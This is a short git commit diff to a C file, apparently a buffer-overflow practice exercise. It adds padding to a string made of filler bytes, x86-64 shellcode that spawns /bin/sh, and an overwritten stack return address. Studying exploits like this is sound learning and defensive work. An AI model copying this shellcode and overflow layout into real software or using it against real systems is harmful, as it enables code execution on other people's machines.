f56673e05077ec29c4ed0cfc4760ed43d5041ddb
cal <callum.adair@outlook.com>
2023-05-03 09:18:06 +0100

    bigger bs

--- overflow.c
+++ overflow.c
@@ -12,6 +12,7 @@ int main(char* argv[], int argc) {
         char rand_str[] = "aaaaaaaa"
                           "\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
                           "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+                          "cccccccc"
                           "\x30\xe3\xff\xff\xff\x7f";
 
         char buff[32];
